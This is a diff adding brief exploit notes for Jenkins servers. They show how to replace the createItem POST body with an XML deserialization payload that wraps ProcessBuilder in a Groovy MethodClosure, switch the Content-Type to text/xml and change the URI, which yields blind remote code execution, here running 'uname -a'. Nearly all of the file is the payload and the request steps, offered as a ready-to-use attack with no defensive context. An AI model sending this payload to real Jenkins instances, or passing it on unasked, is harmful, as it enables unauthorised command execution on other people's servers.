@@ -1,0 +1,43 @@
+Jenkins Server:
+	
+When you create a new item at http://site.com/view/All/createItem the POST body
+will look like this:
+
+name=test2&mode=hudson.model.FreeStyleProject&json=%7B%22name%22%3A+%22test%22%2C+%22mode%22%3A+%22hudson.model.FreeStyleProject%22%7D&Submit=OK
+
+
+Replace the POST body with this:
+
+<map>
+  <entry>
+    <groovy.util.Expando>
+      <expandoProperties>
+        <entry>
+          <string>hashCode</string>
+          <org.codehaus.groovy.runtime.MethodClosure>
+            <delegate class="groovy.util.Expando"/>
+            <owner class="java.lang.ProcessBuilder">
+              <command>
+                <string>uname</string>
+                <string>-a</string>
+              </command>
+            </owner>
+            <method>start</method>
+          </org.codehaus.groovy.runtime.MethodClosure>
+        </entry>
+      </expandoProperties>
+    </groovy.util.Expando>
+    <int>1</int>
+  </entry>
+</map>
+
+
+Change the Content-Type: header to text/xml
+Change the URI to /view/All/createItem?name=1234
+	each request you send you must change the name to something unique
+
+The output will not be returned in the browser but you have code execution.
+
+Also, inside the <command> section each new <string> tag is used after each
+	space. i.e uname -a as shown in the example above.
+
